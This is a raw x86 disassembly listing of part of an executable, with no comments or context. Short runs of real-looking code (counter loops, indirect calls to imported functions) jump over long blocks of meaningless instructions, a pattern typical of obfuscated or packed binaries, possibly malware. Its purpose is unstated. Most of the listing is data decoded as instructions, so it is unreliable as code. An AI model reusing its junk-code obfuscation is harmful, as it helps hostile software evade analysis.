  407a80:	mov    dl,0xbe
  407a82:	mov    eax,ds:0x845e25bd
  407a87:	fld    TBYTE PTR [eax-0x80]
  407a8a:	xor    al,0xee
  407a8c:	in     al,dx
  407a8d:	push   eax
  407a8e:	xor    ecx,DWORD PTR [edi+0x7e]
  407a91:	je     0x407a9d
  407a93:	adc    eax,0x7cf7930a
  407a98:	and    DWORD PTR [edx-0x18],0x3fae9406
  407a9f:	xchg   ecx,eax
  407aa0:	push   0x256bd3fe
  407aa5:	adc    BYTE PTR [edx-0x50e88f0c],cl
  407aab:	push   0xbae0923c
  407ab0:	dec    ecx
  407ab1:	jno    0x407a90
  407ab3:	shr    BYTE PTR [edi-0x256e27c],cl
  407ab9:	lods   eax,DWORD PTR ds:[esi]
  407aba:	mov    ecx,0x7f1aee79
  407abf:	push   esi
  407ac0:	out    0x75,al
  407ac2:	xchg   ebp,eax
  407ac3:	add    DWORD PTR [esi-0x746e31de],ebp
  407ac9:	pop    edx
  407aca:	mov    DWORD PTR [ebp-0x28],0xf89c8533
  407ad1:	add    edx,DWORD PTR ds:0x432dce
  407ad7:	mov    DWORD PTR [ebp-0x2c],0xf89c8532
  407ade:	mov    edi,DWORD PTR ds:0x43436a
  407ae4:	sub    DWORD PTR ds:0x434372,edi
  407aea:	mov    DWORD PTR [ebp-0x30],0xf89c853d
  407af1:	mov    DWORD PTR [ebp-0x34],0xf89c853c
  407af8:	and    DWORD PTR ds:0x434425,edx
  407afe:	mov    DWORD PTR [ebp-0x38],0xf89c853f
  407b05:	jmp    0x407d19
  407b0a:	lods   eax,DWORD PTR ds:[esi]
  407b0b:	mov    ds:0x75115609,al
  407b10:	jno    0x407b73
  407b12:	fidiv  DWORD PTR [edi+0x1017b7f9]
  407b18:	lods   al,BYTE PTR ds:[esi]
  407b19:	fst    DWORD PTR [esp+ecx*8+0x70]
  407b1d:	jo     0x407b88
  407b1f:	jg     0x407b91
  407b21:	jo     0x407b38
  407b23:	inc    ebx
  407b24:	leave  
  407b25:	push   ds
  407b26:	sbb    bl,BYTE PTR [edi+esi*8+0xdbd5be8]
  407b2d:	mov    ds:0xfdb2282d,eax
  407b32:	fisub  WORD PTR [edi]
  407b34:	dec    esi
  407b35:	je     0x407b3d
  407b37:	inc    eax
  407b38:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407b39:	out    0x4e,eax
  407b3b:	sti    
  407b3c:	fnstcw WORD PTR [si]
  407b3f:	jg     0x407b60
  407b41:	push   edx
  407b42:	mov    ah,BYTE PTR [ebx+0x9]
  407b45:	(bad)  
  407b46:	mul    DWORD PTR [ebp-0x56]
  407b49:	pusha  
  407b4a:	adc    eax,0x599192ec
  407b4f:	mov    dl,0x99
  407b51:	pop    esp
  407b52:	push   ecx
  407b53:	repnz or eax,0xc2e1e6b7
  407b59:	cmp    BYTE PTR [edx-0x65],bh
  407b5c:	xlat   BYTE PTR ds:[ebx]
  407b5d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407b5e:	xor    eax,0x94788c3d
  407b63:	and    edx,DWORD PTR [eax+ebp*1-0x78]
  407b67:	dec    edi
  407b68:	cmp    edi,DWORD PTR [ebp+0x6cf26c04]
  407b6e:	leave  
  407b6f:	fimul  DWORD PTR [ebp+edi*1+0x5995e45c]
  407b76:	ins    BYTE PTR es:[edi],dx
  407b77:	push   ebp
  407b78:	inc    esi
  407b79:	test   BYTE PTR [ecx],0x47
  407b7c:	in     eax,0xee
  407b7e:	cdq    
  407b7f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407b80:	ret    
  407b81:	mov    bl,0x74
  407b83:	nop
  407b84:	in     al,0x18
  407b86:	retf   
  407b87:	sti    
  407b88:	mov    bh,0x7d
  407b8a:	fistp  QWORD PTR ds:0x669602a9
  407b90:	sbb    BYTE PTR [ecx+0x0],dh
  407b93:	imul   edx,DWORD PTR [eax-0x1d],0xffffffae
  407b97:	jl     0x407bc7
  407b99:	call   0xc333c423
  407b9e:	(bad)  
  407b9f:	pushf  
  407ba0:	cmp    ah,BYTE PTR [ecx+0x25]
  407ba3:	push   edx
  407ba4:	(bad)  
  407ba5:	xor    eax,ecx
  407ba7:	dec    esp
  407ba8:	or     al,0xce
  407baa:	out    0xff,eax
  407bac:	cwde   
  407bad:	inc    edi
  407bae:	push   ebx
  407baf:	dec    ecx
  407bb0:	gs aam 0x72
  407bb3:	pop    edi
  407bb4:	addr16 push ebx
  407bb6:	and    eax,0x572710e9
  407bbb:	cdq    
  407bbc:	xchg   ebx,eax
  407bbd:	add    esi,esi
  407bbf:	cld    
  407bc0:	retf   
  407bc1:	and    al,0x8a
  407bc3:	fist   DWORD PTR [esi-0x51]
  407bc6:	or     esp,DWORD PTR [edx]
  407bc8:	adc    dl,bl
  407bca:	adc    cl,0xe1
  407bcd:	nop
  407bce:	enter  0xcd52,0x34
  407bd2:	cmp    al,0x9a
  407bd4:	out    dx,al
  407bd5:	push   ds
  407bd6:	ins    DWORD PTR es:[edi],dx
  407bd7:	xchg   ebp,eax
  407bd8:	jl     0x407bee
  407bda:	mov    al,ds:0xf3a30df3
  407bdf:	test   BYTE PTR [ecx],al
  407be1:	rol    BYTE PTR [eax-0x2bc5cbb4],cl
  407be7:	jae    0x407b96
  407be9:	imul   ebp,DWORD PTR [ebp+0x3d5bf8b2],0x6e648711
  407bf3:	jg     0x407bd3
  407bf5:	jbe    0x407bb5
  407bf7:	sbb    DWORD PTR ds:0xc4a73ab,esp
  407bfd:	jnp    0x407c34
  407bff:	push   ecx
  407c00:	push   ds
  407c01:	and    al,0xac
  407c03:	pop    ebp
  407c04:	test   al,0xd3
  407c06:	pop    edx
  407c07:	cli    
  407c08:	loop   0x407c67
  407c0a:	repnz pop edx
  407c0c:	and    eax,0x80f5572c
  407c11:	out    dx,eax
  407c12:	aas    
  407c13:	push   ebx
  407c14:	dec    ecx
  407c15:	je     0x407ba7
  407c17:	stc    
  407c18:	pop    es
  407c19:	pop    esi
  407c1a:	in     al,dx
  407c1b:	nop
  407c1c:	pop    ebp
  407c1d:	jmp    0x402a9304
  407c22:	sbb    bl,dh
  407c24:	ds and ebp,edi
  407c27:	aad    0xe0
  407c29:	fadd   QWORD PTR [ebx-0x1cb3b598]
  407c2f:	mov    DWORD PTR [edi-0x62],eax
  407c32:	push   ebp
  407c33:	inc    edx
  407c34:	imul   esi,DWORD PTR [ebp+0x6d6375d3],0xfffffff3
  407c3b:	(bad)  
  407c3c:	jl     0x407cb3
  407c3e:	pop    ebx
  407c3f:	pop    esi
  407c40:	out    dx,eax
  407c41:	push   edi
  407c42:	iret   
  407c43:	out    0x33,al
  407c45:	shl    DWORD PTR [esi-0x7],cl
  407c48:	fcom   QWORD PTR [ebx+0x9]
  407c4b:	gs xchg dh,bh
  407c4e:	xor    eax,0x87b7b7c0
  407c53:	rcr    DWORD PTR [edi-0x1d2f5bb9],0x6e
  407c5a:	jno    0x407bfe
  407c5c:	xchg   ebp,eax
  407c5d:	mov    dl,0xa9
  407c5f:	fisttp DWORD PTR [ecx]
  407c61:	pop    ecx
  407c62:	(bad)  
  407c63:	in     eax,0x50
  407c65:	bound  esp,QWORD PTR [ecx]
  407c67:	push   edi
  407c68:	test   dh,bh
  407c6a:	and    al,0xf1
  407c6c:	(bad)  
  407c6d:	push   ds
  407c6e:	lods   al,BYTE PTR ds:[esi]
  407c6f:	add    al,0x69
  407c71:	aaa    
  407c72:	mov    DWORD PTR ds:0x246f5795,esi
  407c78:	cmp    dl,BYTE PTR [edx]
  407c7a:	cdq    
  407c7b:	pop    edx
  407c7c:	call   0x1376:0xebfdf926
  407c83:	xor    eax,0xe81fb068
  407c88:	push   esp
  407c89:	mov    edi,0xe7c1444c
  407c8e:	sub    BYTE PTR [ecx+ecx*1-0x465ace1e],0xad
  407c96:	call   0xa4b5:0xa2d0d65e
  407c9d:	sbb    eax,0xb88f92ab
  407ca2:	(bad)  
  407ca3:	push   0xfffffff4
  407ca5:	aaa    
  407ca6:	and    BYTE PTR [ecx+0x2f444362],0x52
  407cad:	sahf   
  407cae:	stos   BYTE PTR es:[edi],al
  407caf:	fcmovb st,st(6)
  407cb1:	(bad)  
  407cb2:	in     eax,dx
  407cb3:	push   0x4ef14795
  407cb8:	or     eax,0xdf9ad278
  407cbd:	dec    ebp
  407cbe:	mov    al,0xf2
  407cc0:	sub    dl,BYTE PTR [edx-0x7f994294]
  407cc6:	lahf   
  407cc7:	mov    ebp,0xcb3f3bae
  407ccc:	repz xor BYTE PTR ds:0x75190065,cl
  407cd3:	(bad)  
  407cd4:	jmp    0xea303d54
  407cd9:	or     al,0x4
  407cdb:	outs   dx,DWORD PTR ds:[esi]
  407cdc:	or     al,0x4f
  407cde:	stc    
  407cdf:	test   ah,cl
  407ce1:	xchg   esp,eax
  407ce2:	adc    DWORD PTR [ebx+0x6c],edx
  407ce5:	jle    0x407d42
  407ce7:	adc    al,0x5b
  407ce9:	mov    edx,0xe37455fe
  407cee:	mov    dl,0xb7
  407cf0:	rcr    DWORD PTR [edx+0x4b72da49],0xcc
  407cf7:	push   0x6d2cd7b8
  407cfc:	or     ah,BYTE PTR [ebx]
  407cfe:	sub    eax,0x1bbda89a
  407d03:	push   0x64
  407d05:	add    ecx,DWORD PTR [esi+ebp*1]
  407d08:	js     0x407cfe
  407d0a:	push   ebp
  407d0b:	jp     0x407d3a
  407d0d:	cmp    eax,0xffffff87
  407d10:	sbb    cl,BYTE PTR [esi-0x4e840f7b]
  407d16:	iret   
  407d17:	pop    ecx
  407d18:	dec    esi
  407d19:	mov    DWORD PTR [ebp-0x3c],0xf89c853e
  407d20:	mov    DWORD PTR ds:0x43438e,0x1a
  407d2a:	cmp    DWORD PTR ds:0x43438e,0x0
  407d31:	je     0x407d7e
  407d37:	cmp    DWORD PTR ds:0x43438e,0x7
  407d3e:	jne    0x407d4c
  407d44:	push   0x9
  407d46:	call   DWORD PTR ds:0x4329ce
  407d4c:	cmp    DWORD PTR ds:0x43438e,0x8
  407d53:	jne    0x407d66
  407d59:	mov    edi,DWORD PTR ds:0x43438e
  407d5f:	dec    edi
  407d60:	mov    DWORD PTR ds:0x43438e,edi
  407d66:	mov    edi,DWORD PTR ds:0x43438e
  407d6c:	dec    edi
  407d6d:	mov    DWORD PTR ds:0x43438e,edi
  407d73:	jmp    0x407d2a
  407d78:	adc    DWORD PTR ds:0x432dce,ecx
  407d7e:	mov    edx,DWORD PTR [ebp+0x8]
  407d81:	xor    edx,eax
  407d83:	sbb    edi,DWORD PTR ds:0x43439a
  407d89:	mov    edi,DWORD PTR [ebp-0x10]
  407d8c:	add    edx,ecx
  407d8e:	cmp    edi,edx
  407d90:	jmp    0x407fa4
  407d95:	mov    BYTE PTR [ebp+0x51b14fb4],ch
  407d9b:	jae    0x407e12
  407d9d:	xchg   esp,eax
  407d9e:	xor    al,0x31
  407da0:	xchg   BYTE PTR [ebx+0x4d2b6d69],cl
  407da6:	retf   0x7070
  407da9:	imul   edi,DWORD PTR [edi+0x70],0xdc335570
  407db0:	outs   dx,DWORD PTR ds:[esi]
  407db1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407db2:	lock push eax
  407db4:	mov    dl,0xbb
  407db6:	shl    BYTE PTR [edi-0x1b652302],0x7
  407dbd:	jo     0x407db9
  407dbf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407dc0:	sub    al,0x64
  407dc2:	xor    al,0xb2
  407dc4:	inc    ebp
  407dc5:	jb     0x407e1e
  407dc7:	pushf  
  407dc8:	or     BYTE PTR [esp+ecx*1],al
  407dcb:	pop    di
  407dcd:	pop    edi
  407dce:	dec    ecx
  407dcf:	add    DWORD PTR [edx-0x4e8f9685],0x51fe6be7
  407dd9:	dec    esi
  407dda:	cwde   
  407ddb:	inc    edx
  407ddc:	mov    bh,0xda
  407dde:	jmp    0x224b:0x62ad0d1a
  407de5:	retf   0x3f1
  407de8:	aaa    
  407de9:	fs in  eax,dx
  407deb:	fs xchg edx,eax
  407ded:	xchg   edx,eax
  407dee:	jmp    0x9c6287cc
  407df3:	xor    ebx,DWORD PTR [ebx]
  407df5:	fidivr DWORD PTR [ebp+0x51e62dc2]
  407dfb:	leave  
  407dfc:	test   DWORD PTR [ebp-0x3e47aae7],edx
  407e02:	pusha  
  407e03:	cdq    
  407e04:	pop    es
  407e05:	cmp    al,0x3d
  407e07:	sub    eax,0x390f09f9
  407e0c:	xchg   ebx,eax
  407e0d:	out    dx,eax
  407e0e:	and    bh,BYTE PTR [esi-0x32]
  407e11:	mov    ?,WORD PTR [ecx]
  407e13:	lds    edx,FWORD PTR [ebx]
  407e15:	mov    dh,0x28
  407e17:	mov    bl,0xed
  407e19:	mov    bh,0xaf
  407e1b:	nop
  407e1c:	pop    esp
  407e1d:	xor    edi,edx
  407e1f:	test   al,0xc8
  407e21:	cmc    
  407e22:	and    esp,DWORD PTR [ebp-0x260d56ff]
  407e28:	dec    edx
  407e29:	mov    dh,0x58
  407e2b:	imul   ebp,ebx,0xffffff81
  407e2e:	fnstcw WORD PTR [eax]
  407e30:	xor    edx,edx
  407e32:	sbb    esp,DWORD PTR [ebx+0x5901a309]
  407e38:	pop    ecx
  407e39:	aad    0xee
  407e3b:	lods   eax,DWORD PTR ds:[esi]
  407e3c:	inc    ebp
  407e3d:	cld    
  407e3e:	lahf   
  407e3f:	ss cld 
  407e41:	out    0x12,al
  407e43:	and    DWORD PTR [ecx+0xb388509],ebx
  407e49:	jle    0x407de6
  407e4b:	jns    0x407e27
  407e4d:	lahf   
  407e4e:	mov    cl,BYTE PTR [ebp-0x8be33f2]
  407e54:	sbb    eax,0x9323530d
  407e59:	push   eax
  407e5a:	out    dx,al
  407e5b:	leave  
  407e5c:	or     al,0x5b
  407e5e:	mov    ebx,0x9bcd6b9a
  407e63:	rcr    BYTE PTR [ebx+0x18],cl
  407e66:	xchg   esi,eax
  407e67:	dec    edi
  407e68:	or     eax,0xcafaae62
  407e6d:	scas   eax,DWORD PTR es:[edi]
  407e6e:	cli    
  407e6f:	add    ebp,ebp
  407e71:	or     ebx,DWORD PTR [esp+ebx*1+0x2b53ad2]
  407e78:	push   ecx
  407e79:	pusha  
  407e7a:	shr    BYTE PTR [ebx+0x74],1
  407e7d:	mov    esp,0xd128395f
  407e82:	stos   DWORD PTR es:[edi],eax
  407e83:	gs add DWORD PTR cs:[edi+0x14369baa],edi
  407e8b:	rol    esp,cl
  407e8d:	inc    ebp
  407e8e:	(bad)  [esi+0x58]
  407e91:	cmc    
  407e92:	and    ecx,DWORD PTR [eax]
  407e94:	(bad)  
  407e95:	sub    eax,0x747ab9e3
  407e9a:	test   eax,0x27992794
  407e9f:	inc    ebp
  407ea0:	mov    bh,0xb5
  407ea2:	mov    WORD PTR [edi+0x71355c60],?
  407ea8:	xor    eax,0x9892ed0f
  407ead:	jb     0x407f20
  407eaf:	cs scas eax,DWORD PTR es:[edi]
  407eb1:	xchg   ebp,eax
  407eb2:	and    edx,eax
  407eb4:	pop    esi
  407eb5:	outs   dx,BYTE PTR ds:[esi]
  407eb6:	pop    es
  407eb7:	jg     0x407ed0
  407eb9:	xchg   ecx,eax
  407eba:	(bad)  
  407ebb:	cmp    BYTE PTR [edx+0x6],bh
  407ebe:	xlat   BYTE PTR ds:[ebx]
  407ebf:	scas   al,BYTE PTR es:[edi]
  407ec0:	fisub  DWORD PTR [edx]
  407ec2:	dec    esi
  407ec3:	lea    ebx,[ebx+ecx*4-0x77]
  407ec7:	or     ch,BYTE PTR [esi+0x51947e9]
  407ecd:	stos   DWORD PTR es:[edi],eax
  407ece:	aas    
  407ecf:	clc    
  407ed0:	nop
  407ed1:	pop    esp
  407ed2:	mov    dl,0x7f
  407ed4:	or     al,BYTE PTR [esp+eiz*8+0x68]
  407ed8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407ed9:	cmp    DWORD PTR [ebx],0xf
  407edc:	mov    ds:0x6f067234,al
  407ee1:	xbegin 0x7280d30e
  407ee7:	mov    dh,0xb8
  407ee9:	fstp   QWORD PTR [edx+0x1334c87b]
  407eef:	lods   al,BYTE PTR ds:[esi]
  407ef0:	mov    edx,DWORD PTR [esi]
  407ef2:	in     al,0xb8
  407ef4:	add    DWORD PTR [ebx-0x6bdc5c46],ebx
  407efa:	int3   
  407efb:	mov    edi,0xda21d7f8
  407f00:	push   esi
  407f01:	push   esp
  407f02:	sub    DWORD PTR [eax],eax
  407f04:	mul    DWORD PTR [ecx-0x36]
  407f07:	bnd ja 0x407eac
  407f0a:	sbb    DWORD PTR [edi+edx*1],ebx
  407f0d:	xor    eax,0x1b336674
  407f12:	jne    0x407ec1
  407f14:	call   0xb16eccdf
  407f19:	jecxz  0x407eee
  407f1b:	sti    
  407f1c:	push   edx
  407f1d:	out    0xcb,al
  407f1f:	repnz mov ch,0xa1
  407f22:	js     0x407f4e
  407f24:	stc    
  407f25:	and    BYTE PTR [edx+esi*8+0x33c14a90],bh
  407f2c:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  407f2e:	sbb    BYTE PTR [ebp+0x1f2dac6a],ah
  407f34:	cli    
  407f35:	fwait
  407f36:	xor    al,0xa2
  407f38:	outs   dx,DWORD PTR ds:[esi]
  407f39:	adc    BYTE PTR [ecx+0x78],ah
  407f3c:	int3   
  407f3d:	xor    dh,BYTE PTR [edx]
  407f3f:	sub    bh,bh
  407f41:	into   
  407f42:	cdq    
  407f43:	sahf   
  407f44:	inc    ebp
  407f45:	xchg   edi,eax
  407f46:	push   0x64
  407f48:	shl    DWORD PTR [edi],1
  407f4a:	pop    es
  407f4b:	adc    dl,dl
  407f4d:	mov    dh,0x6e
  407f4f:	push   ebp
  407f50:	add    ebp,DWORD PTR [ebp+0x17068437]
  407f56:	add    DWORD PTR [eax+0x23],ebx
  407f59:	call   0xfac:0xa10e14df
  407f60:	pop    ebp
  407f61:	daa    
  407f62:	adc    al,0x5d
  407f64:	and    al,0x1d
  407f66:	int    0xe
  407f68:	mov    esp,0xf8a5aee0
  407f6d:	shr    BYTE PTR [eax-0x53],1
  407f70:	mov    cl,0xba
  407f72:	cld    
  407f73:	pop    es
  407f74:	inc    eax
  407f75:	mov    esi,0x9883e4d9
  407f7a:	pop    ds
  407f7b:	cdq    
  407f7c:	jl     0x407ff1
  407f7e:	push   edi
  407f7f:	bound  ecx,QWORD PTR [eax+0x6d]
  407f82:	retf   0xb87d
  407f85:	mov    WORD PTR [ecx+eiz*8-0x2b],?
  407f89:	adc    esi,ecx
  407f8b:	cld    
  407f8c:	test   BYTE PTR [esi],ch
  407f8e:	leave  
  407f8f:	xchg   ebp,eax
  407f90:	sahf   
  407f91:	sbb    DWORD PTR [edi+0x4d78cede],ebx
  407f97:	fstp   DWORD PTR [edi]
  407f99:	stos   BYTE PTR es:[edi],al
  407f9a:	pop    eax
  407f9b:	arpl   WORD PTR [ebx+0x2],sp
  407f9e:	xchg   ebx,eax
  407f9f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407fa0:	jge    0x407f2c
  407fa2:	sbb    eax,0x49840fa5
  407fa7:	sbb    eax,0xc7530000
  407fac:	add    eax,0x43437a
  407fb1:	cmp    ah,BYTE PTR [eax+eax*1+0x0]
  407fb5:	jmp    0x409aba
  407fba:	mov    DWORD PTR ds:0x432708,0x445
  407fc4:	mov    edx,DWORD PTR [ebp-0x8]
  407fc7:	and    DWORD PTR ds:0x43438a,0x0
  407fd1:	jmp    0x407fe5
  407fd6:	xor    edi,edi
  407fd8:	or     edi,DWORD PTR ds:0x43438a
  407fde:	inc    edi
  407fdf:	mov    DWORD PTR ds:0x43438a,edi
  407fe5:	cmp    DWORD PTR ds:0x43438a,0x18
  407fec:	jae    0x40802f
  407ff2:	cmp    DWORD PTR ds:0x43438a,0xc
  407ff9:	jne    0x40800a
  407fff:	push   0x7154
  408004:	call   DWORD PTR ds:0x432c3e
  40800a:	cmp    DWORD PTR ds:0x43438a,0xb
  408011:	jne    0x408024
  408017:	mov    edi,DWORD PTR ds:0x43438a
  40801d:	inc    edi
  40801e:	mov    DWORD PTR ds:0x43438a,edi
  408024:	jmp    0x407fd6
  408029:	xor    DWORD PTR ds:0x43439e,ecx
  40802f:	mov    edi,DWORD PTR [ebp-0x10]
  408032:	jmp    0x408246
  408037:	(bad)  
  408038:	jmp    0x408005
  40803a:	adc    ebp,DWORD PTR [ecx+0x33]
  40803d:	inc    esi
  40803e:	jno    0x40804f
  408040:	pushf  
  408041:	jo     0x407fca
  408043:	lds    eax,FWORD PTR [ecx-0xe]
  408046:	fld    DWORD PTR [esi-0x38]
  408049:	jo     0x4080bb
  40804b:	imul   edi,DWORD PTR [edi+0x70],0xe0c6f170
  408052:	add    esp,DWORD PTR [ecx-0x6]
  408055:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408056:	sub    eax,0xf56432e4
  40805b:	mov    dh,0xe6
  40805d:	inc    esp
  40805e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40805f:	jbe    0x40803e
  408061:	dec    ebp
  408062:	dec    ebx
  408063:	inc    esp
  408064:	stos   DWORD PTR es:[edi],eax
  408065:	adc    al,0x91
  408067:	push   esi
  408068:	cmc    
  408069:	jle    0x40802f
  40806b:	xchg   DWORD PTR [esi+eax*4+0x47],edi
  40806f:	push   ebx
  408070:	mov    dl,0x6f
  408072:	or     ch,ch
  408074:	adc    cl,BYTE PTR [ecx-0x3d73b66]
  40807a:	(bad)  
  40807b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40807c:	stc    
  40807d:	fistp  DWORD PTR [ecx]
  40807f:	pop    edi
  408080:	stos   BYTE PTR es:[edi],al
  408081:	fld    QWORD PTR [ebx+0x5b]
  408084:	test   DWORD PTR [ebx+0x4d40fd54],ebx
  40808a:	jl     0x408042
  40808c:	pop    eax
  40808d:	dec    esp
  40808e:	mov    ebp,0x44428ab7
  408093:	and    DWORD PTR [eax+edx*1-0x74],0x55d68ff8
  40809b:	dec    edi
  40809c:	test   al,0x6a
  40809e:	aas    
  40809f:	(bad)  
  4080a0:	push   cs
  4080a1:	inc    edi
  4080a2:	cdq    
  4080a3:	pop    ss
  4080a4:	hlt    
  4080a5:	(bad)  [edi]
  4080a7:	arpl   WORD PTR [ebx-0x3ea9ef5b],ax
  4080ad:	pusha  
  4080ae:	inc    eax
  4080af:	call   0xc34f4622
  4080b4:	dec    esp
  4080b5:	mov    dl,0x17
  4080b7:	and    DWORD PTR [ebp+0x5d],esp
  4080ba:	mov    dh,0xd0
  4080bc:	mov    BYTE PTR [esi+0x16],al
  4080bf:	ret    0x9112
  4080c2:	mov    esp,0xb73e1260
  4080c7:	xor    al,BYTE PTR [eax+0x155b4753]
  4080cd:	outs   dx,BYTE PTR ds:[esi]
  4080ce:	(bad)  
  4080cf:	mov    al,0xd9
  4080d1:	test   eax,0x44cfa78d
  4080d6:	sahf   
  4080d7:	sbb    ebp,ebp
  4080d9:	jo     0x408159
  4080db:	popf   
  4080dc:	cdq    
  4080dd:	or     bh,ch
  4080df:	mov    ebx,0xdc1d6448
  4080e4:	xor    eax,0xff9ff5b4
  4080e9:	(bad)  
  4080ea:	mov    ds:0xcbb98bd4,eax
  4080ef:	loopne 0x4080c5
  4080f1:	aam    0x6d
  4080f3:	enter  0x5235,0xdc
  4080f7:	jno    0x408147
  4080f9:	push   ss
  4080fa:	sub    eax,0x82205a45
  4080ff:	mov    DWORD PTR cs:[edi],ecx
  408102:	inc    ebp
  408103:	ins    BYTE PTR es:[edi],dx
  408104:	push   ebp
  408105:	jecxz  0x4080c3
  408107:	fwait
  408108:	inc    ecx
  408109:	es dec esp
  40810b:	mov    al,ds:0x5b0721cd
  408110:	cmp    al,0xec
  408112:	push   edx
  408113:	xchg   BYTE PTR [eax-0x42a2d64a],cl
  408119:	xchg   cx,ax
  40811b:	pop    ebp
  40811c:	push   ds
  40811d:	mov    eax,DWORD PTR [edi]
  40811f:	add    eax,0x85cc720d
  408124:	scas   al,BYTE PTR es:[edi]
  408125:	mov    dl,cl
  408127:	mov    ebp,0x175aa7c6
  40812c:	ds and dl,ch
  40812f:	jmp    0x40816f
  408131:	into   
  408132:	hlt    
  408133:	dec    ecx
  408134:	test   al,0x0
  408136:	fistp  QWORD PTR [edi]
  408138:	pop    ss
  408139:	add    bh,BYTE PTR [eax]
  40813b:	mov    al,ds:0x64dc46d1
  408140:	jnp    0x40812b
  408142:	push   ss
  408143:	jno    0x40818d
  408145:	cdq    
  408146:	sti    
  408147:	ja     0x4080f6
  408149:	retf   0xacdf
  40814c:	icebp  
  40814d:	mov    esp,0xc477165c
  408152:	imul   edx,DWORD PTR [edi+0x6a0f74e6],0xffffffc6
  408159:	mov    al,ds:0xfcd089a2
  40815e:	push   esp
  40815f:	jno    0x4080f0
  408161:	es aad 0x94
  408164:	and    dh,BYTE PTR [eax-0x20]
  408167:	sub    eax,0x9b6dcedb
  40816c:	sub    BYTE PTR [edi],ah
  40816e:	push   ds
  40816f:	enter  0x75e5,0xd8
  408173:	jne    0x408130
  408175:	in     eax,dx
  408176:	jg     0x408154
  408178:	pushf  
  408179:	and    esi,DWORD PTR [ebp-0x5]
  40817c:	leave  
  40817d:	div    cl
  40817f:	or     al,0xf6
  408181:	xor    dh,BYTE PTR [ecx]
  408183:	sti    
  408184:	les    edi,FWORD PTR [edi]
  408186:	in     al,dx
  408187:	ret    0xda4b
  40818a:	mov    al,ds:0x40a3cfd5
  40818f:	pop    ecx
  408190:	sbb    bl,BYTE PTR [ecx+0x2e]
  408193:	les    edi,FWORD PTR [edx+ecx*8]
  408196:	add    cl,BYTE PTR [edi+0x4468c7b1]
  40819c:	xlat   BYTE PTR ds:[ebx]
  40819d:	cld    
  40819e:	adc    DWORD PTR [ebp+0x68a76f8f],edi
  4081a4:	jmp    0xa13c:0x227b8e07
  4081ab:	fs jp  0x40816d
  4081ae:	cs (bad) 
  4081b0:	mov    BYTE PTR [edi],al
  4081b2:	rcr    ebp,0x47
  4081b5:	mov    ebx,0xf719cc1e
  4081ba:	pop    esi
  4081bb:	cmp    al,0x4
  4081bd:	inc    ebp
  4081be:	addr16 mov ds:0x1b98,al
  4081c2:	mov    bl,0x36
  4081c4:	outs   dx,BYTE PTR ds:[esi]
  4081c5:	ds dec esi
  4081c7:	push   0xcbd0399
  4081cc:	retf   0x53e
  4081cf:	fimul  WORD PTR [edi-0x7d]
  4081d2:	cmp    DWORD PTR [esp+ebp*2],esi
  4081d5:	sub    ah,BYTE PTR [edx+0x73a7f2f7]
  4081db:	inc    ecx
  4081dc:	cmc    
  4081dd:	lahf   
  4081de:	cmc    
  4081df:	mov    WORD PTR [edx-0x41],?
  4081e2:	dec    eax
  4081e3:	and    BYTE PTR [edx+0x7320e6ee],bh
  4081e9:	mov    eax,0xaab19c75
  4081ee:	lods   al,BYTE PTR ds:[esi]
  4081ef:	lds    ebx,FWORD PTR [edi+0x7f]
  4081f2:	jbe    0x40822e
  4081f4:	push   esi
  4081f5:	aad    0x3d
  4081f7:	jb     0x408222
  4081f9:	test   eax,0xe49a1ff5
  4081fe:	out    0x96,al
  408200:	jae    0x408244
  408202:	les    esi,FWORD PTR [ecx-0x1ce5f78]
  408208:	je     0x4081c3
  40820a:	add    BYTE PTR [eax],bl
  40820c:	shr    DWORD PTR [edi-0x49eddcf2],cl
  408212:	mov    ah,bh
  408214:	pushf  
  408215:	iret   
  408216:	xchg   ebx,eax
  408217:	jbe    0x4081eb
  408219:	pop    ds
  40821a:	adc    DWORD PTR [ebx+0x41],ecx
  40821d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40821e:	aas    
  40821f:	in     eax,dx
  408220:	dec    eax
  408221:	cmc    
  408222:	sbb    ch,BYTE PTR [ebx+0x13fa3597]
  408228:	in     al,dx
  408229:	mov    ds:0x59135a57,eax
  40822e:	push   esp
  40822f:	push   cs
  408230:	mov    ch,0x8a
  408232:	shl    DWORD PTR [edx+0x36602b5d],cl
  408238:	mov    bh,BYTE PTR [eax-0x528758f3]
  40823e:	int    0x2e
  408240:	in     eax,0x79
  408242:	ret    0x633a
  408245:	out    dx,eax
  408246:	sub    edi,edx
  408248:	mov    edx,DWORD PTR [ebp-0x4]
  40824b:	xor    edx,eax
  40824d:	sbb    DWORD PTR ds:0x432de2,0x10fd
  408257:	add    edx,ecx
  408259:	mov    DWORD PTR ds:0x434372,0xe69
  408263:	cmp    edi,edx
  408265:	mov    DWORD PTR ds:0x434386,0xfd5
  40826f:	jmp    0x408483
  408274:	sbb    DWORD PTR [edi+eiz*4],ebp
  408277:	pop    edx
  408278:	mov    ch,0x71
  40827a:	loope  0x4082e7
  40827c:	push   ebx
  40827d:	inc    edx
  40827e:	test   al,0x19
  408280:	outs   dx,BYTE PTR ds:[esi]
  408281:	xor    eax,DWORD PTR [ebp+0x70d6bf58]
  408287:	jo     0x4082f2
  408289:	jg     0x4082fb
  40828b:	jo     0x40824c
  40828d:	pop    edi
  40828e:	(bad)  
  40828f:	(bad)
  408292:	repz mov ebx,gs
  408295:	in     al,dx
  408296:	sub    BYTE PTR [edx+ecx*8-0x58],al
  40829a:	pop    esp
  40829b:	adc    DWORD PTR [edi],eax
  40829d:	mov    bl,0x14
  40829f:	xor    cl,BYTE PTR [edi-0x447f4cd6]
  4082a5:	in     al,dx
  4082a6:	inc    eax
  4082a7:	jmp    ecx
  4082a9:	inc    edi
  4082aa:	mov    ebp,0x923547af
  4082af:	mov    bh,bh
  4082b1:	icebp  
  4082b2:	fild   QWORD PTR [ebp-0x5369ae4e]
  4082b8:	jl     0x408311
  4082ba:	dec    eax
  4082bb:	rcr    dl,0xc5
  4082be:	pop    edx
